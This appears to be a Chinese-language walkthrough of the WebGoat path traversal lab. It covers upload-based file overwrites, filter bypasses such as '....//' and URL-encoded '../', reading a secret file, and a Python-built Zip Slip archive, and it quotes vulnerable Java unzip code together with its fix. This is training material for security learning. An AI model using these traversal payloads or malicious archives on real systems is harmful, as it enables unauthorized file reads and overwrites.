---
id: 
title: Path traversal
---
<!-- muse start -->
Web Goat 对路径遍历的简介，包含浏览文件、上传文件以覆盖目标文件、Zip 归档文件的解压遍历。
上传文件的路径遍历的注入点的本质是：猜测应用程序使用什么数据作为文件名，不一定是经典的原始文件名。
测试时对各项数据使用不同的名称以明显区分。以防万一，如有可能就使用对应的文件类型以减少误报，此处挑战无法使用扩展名匹配但实际类型不同的图片文件通过。
<!-- muse end -->

## 1. 路径遍历

路径遍历（也称目录遍历）是一种安全漏洞，攻击者能够访问或存储应用程序指定位置之外的文件和目录。该漏洞可能导致读取其他目录中的文件，若存在文件上传功能时还可能覆盖关键系统文件。

### 工作原理

例如，假设某应用通过以下格式托管文件：
`http://example.com/file=report.pdf`。

作为攻击者，您可能试图访问其他文件，于是尝试输入：
`http://example.com/file=../../../../../etc/passwd`。

此例中，通过使用`../`（称为点点斜杠，该攻击的别称）逐级向上跳转至文件系统根目录，再访问`/etc/passwd`文件。

当然这是基础示例，多数情况下框架的防护机制会阻止此类操作。因此需要更灵活的策略，例如在请求发送前对`../`进行编码：若对`../`进行URL编码，将得到`%2e%2e%2f`，Web服务器接收请求后会将其解码还原为`../`。

此外，若应用程序过滤了编码字符，可尝试双重编码。当系统A调用系统B时，系统A仅解码一次后向B传递仍包含编码的URL，此时双重编码可能生效。

## 2. 文件上传场景下的路径遍历

在本任务中，目标是通过路径遍历漏洞覆盖文件系统中的指定文件。WebGoat 出于安全教学目的，要求您将文件上传至常规上传路径之外的以下特殊位置：

| 操作系统 | 目标路径 |
|---------|---------|
| Linux | `/home/webgoat/.webgoat-2025.3/PathTraversal` |

选择头像文件后点击上传按钮，得到保存上传文件位置的提示信息
`Profile has been updated, your image is available at: /home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/test"`

对应http请求的截取部分为
```http
POST http://localhost:3000/WebGoat/PathTraversal/profile-upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----geckoformboundary49f03e362b82191b8ca716eaef19470e
Content-Length: 590

------geckoformboundary49f03e362b82191b8ca716eaef19470e
Content-Disposition: form-data; name="uploadedFile"; filename="temp.md"
Content-Type: application/octet-stream

test text
------geckoformboundary49f03e362b82191b8ca716eaef19470e
Content-Disposition: form-data; name="fullName"

test
------geckoformboundary49f03e362b82191b8ca716eaef19470e
Content-Disposition: form-data; name="email"

test@test.com
------geckoformboundary49f03e362b82191b8ca716eaef19470e
Content-Disposition: form-data; name="password"

test
------geckoformboundary49f03e362b82191b8ca716eaef19470e--

```

修改请求体中文件名进行路径遍历
```html
Content-Disposition: form-data; name="uploadedFile"; filename="../../temp.md"
```
尝试各种编码绕过均无效
再看响应的文件名是`test`，尝试修改用户名为 `../test`，通过挑战

不同于常见路径遍历，此处的注入点在用户名而不是文件名。
结果：
文件名 `test`，上传位置在 `PathTraversal/apkallus/`，`../`一组上级目录符号即到达目标位置

而之前的猜测：
文件名 `temp.md`，上传位置在 `PathTraversal/apkallus/test`，使用两组上级目录符号

## 3. 文件上传场景下的路径遍历绕过

开发者已意识到该漏洞并实施修复，从输入中移除了`../`过滤机制。任务目标不变，但需要绕过已实施的修复方案。

| 操作系统 | 目标路径 |
|---------|---------|
| Linux | `/home/webgoat/.webgoat-2025.3/PathTraversal` |

上传文件后提示
`Profile has been updated, your image is available at: /home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/namefoo"`

对应请求截断为，此处修改各字段值以更清晰的区分
```http
POST http://localhost:3000/WebGoat/PathTraversal/profile-upload-fix HTTP/1.1

------geckoformboundary8872e3299327dd2ee304b8dd456a613a
Content-Disposition: form-data; name="uploadedFileFix"; filename="thefile.md"
Content-Type: application/octet-stream

test text
------geckoformboundary8872e3299327dd2ee304b8dd456a613a
Content-Disposition: form-data; name="fullNameFix"

namefoo
------geckoformboundary8872e3299327dd2ee304b8dd456a613a--
```

简单的 `../namefoo` 仍为 ``apkallus/namefoo`

尝试 `..../namefoo` 返回的 `apkallus/..namefoo`
似乎过滤器使用非迭代删除，
于是添加冗余符号 `....//namefoo` 通过挑战

## 4. 文件上传场景下的路径遍历绕过

开发者再次因未对完整名称输入字段进行验证而意识到该漏洞，并实施了修复方案试图解决此安全问题。

任务目标保持不变，但需要测试是否能绕过已实施的修复方案：
| 操作系统 | 目标路径 |
|---------|---------|
| Linux | `/home/webgoat/.webgoat-2025.3/PathTraversal` |

使用更新功能后提示
`Profile has been updated, your image is available at: /home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/thefile.md"`

对应请求截断
```http
POST http://localhost:3000/WebGoat/PathTraversal/profile-upload-remove-user-input HTTP/1.1

------geckoformboundary6c757e099c950a55c41802afdafec5c
Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="thefile.md"
Content-Type: application/octet-stream

test text
------geckoformboundary6c757e099c950a55c41802afdafec5c
```

分析上传信息 `PathTraversal/apkallus/thefile.md`
此处似乎使用原始文件名而不是之前的用户名
尝试修改原始文件名为 `../thefile.md`
```http
Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../thefile.md"
```
通过挑战

## 5. 通过路径遍历检索其他文件

路径遍历攻击并不仅限于文件上传场景。在检索文件时，也可能存在通过路径遍历的方式来获取系统中其他文件的风险。在本次任务中，请尝试找到一个名为 `path-traversal-secret.jpg` 的文件。

目标应用程序功能为点击以查看随机图片
开启拦截代理服务器记录中默认关闭的图片项目
请求为
```http
GET /WebGoat/PathTraversal/random-picture HTTP/1.1
```

响应截取
```
HTTP/1.1 200 
Location: /PathTraversal/random-picture?id=2.jpg
Content-Type: image/jpeg
```

尝试对请求端点添加参数 `id=1`
`GET /WebGoat/PathTraversal/random-picture?id=1 HTTP/1.1`
响应固定为 `id=1.jpg`
`Location: /PathTraversal/random-picture?id=1.jpg`

尝试获取目标文件 
`id=path-traversal-secret`
响应 400

添加上级目录符号 
`id=../path-traversal-secret`
响应 400 以及错误信息
`Illegal characters are not allowed in the query params`

对符号 URL 编码 
`id=%2e%2e%2fpath-traversal-secret`
响应 400

继续向上遍历 
`id=%2e%2e%2f%2e%2e%2fpath-traversal-secret`
得到响应
`You found it submit the SHA-512 hash of your username as answer`

按照提示生成 sha512 后提交，显示通过挑战信息


## 6. Zip Slip漏洞

作为开发者，您经常需要处理ZIP文件，例如文件上传功能或处理以ZIP格式上传的CSV文件集合。Snyk安全团队发现并负责任地披露了一个利用路径遍历的巧妙漏洞。该漏洞可在解压文件时通过路径遍历尝试覆盖目标文件夹之外的文件。例如，在解压ZIP文件时可能覆盖`ls`命令。一旦该命令被替换为包含恶意功能的版本，每次用户输入`ls`时，系统会在显示实际结果前将目录列表信息发送到攻击者服务器，最终实现远程命令执行。

### 问题根源

问题出现在Java中解压ZIP文件的方式上，常见的实现代码如下：

```java
File destinationDir = new File("/tmp/zip");
Enumeration<? extends ZipEntry> entries = zip.entries();
while (entries.hasMoreElements()) {
  ZipEntry e = entries.nextElement();
  // 此处使用zip内文件的名称作为最终文件路径的一部分，导致路径遍历漏洞   
  File f = new File(destinationDir, e.getName());
  InputStream is = zip.getInputStream(e);
  IOUtils.copy(is, write(f));
}
```

表面看代码正常，但正如前文所述，攻击者可通过路径遍历突破`destinationDir`的限制。例如收到包含以下内容的ZIP文件时：

```
orders.csv
../../../../../../../tmp/evil.sh
```

使用上述代码解压后，恶意文件将被保存到`/tmp/evil.sh`。

## 7. Zip Slip任务

本次任务中开发者仅允许上传ZIP文件，但在处理ZIP文件上传时存在编程错误：系统会对ZIP文件进行解压，但不会替换您的现有图片。请尝试绕过该编程错误，覆盖您当前的图片文件。

为简化任务难度，下方提供了需要替换的个人资料图片位置：

| 操作系统 | 目标路径 |
|---------|---------|
| Linux | `/home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/apkallus.jpg` |

使用 python 构建 zip 归档文件路径遍历
```py
import zipfile

with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr('apkallus.jpg', 'foooo') 
```

上传此文件后提示信息：zip 文件成功解压
`Zip file extracted successfully failed to copy the image. Please get in touch with our helpdesk.`

尝试设置文件名进行路径遍历，直到两层遍历 
`../../apkallus.jpg`
显示不同的提示信息
`/tmp/apkallus14357369952357715206/../../apkallus.jpg`

然而继续增加遍历层数，仍然无法通过挑战
`../../../../../../../../../../../../../../../apkallus.jpg`
那么 `tmp` 目录并不在目标路径内
尝试设置完整目标路径进行遍历
`../../home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/apkallus.jpg`
然而持续增加无法通过挑战，仅显示
`Zip file extracted successfully failed to copy the image. Please get in touch with our helpdesk.`

查看 8. 页面的示例解决方案，将之前内容实际为字符的 `apkallus.jpg` 替换为实际图片文件，此处下载的图片文件名为 `account.png`
```py
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.write('account.png', '../../home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/apkallus.jpg') 
```
上传后显示通过挑战的提示

## 8. 解决方案

首先创建一个包含图片的ZIP文件：
```bash
curl -o webwolf.jpg http://127.0.0.1:9090/WebWolf/images/wolf.png
zip profile.zip webwolf.jpg
```

上传该ZIP文件作为个人资料图片后，系统显示如下提示（与任务描述中的软件缺陷一致）：
`Zip file extracted successfully failed to copy the image. Please get in touch with our helpdesk.`

接下来创建利用路径遍历的ZIP文件结构：
```bash
mkdir -p /home/webgoat/.webgoat-2025.3/PathTraversal/apkallus
cd /home/webgoat/.webgoat-2025.3/PathTraversal/apkallus
curl -o apkallus.jpg http://127.0.0.1:9090/WebWolf/images/wolf.png
zip profile.zip ../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/apkallus.jpg
```
上传此ZIP文件即可完成任务。

### 实现原理分析

开发者使用的代码片段存在安全缺陷：
```java
ZipFile zip = new ZipFile(uploadedZipFile);
Enumeration<? extends ZipEntry> entries = zip.entries();
while (entries.hasMoreElements()) {
  ZipEntry e = entries.nextElement(); 
  File profilePicture = new File(uploadDirectory, e.getName());
  InputStream is = zip.getInputStream(e);
  Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
```

修复方案与路径遍历防护措施一致：在第5行通过`profilePicture.getCanonicalPath()`验证最终路径是否符合预期范围。
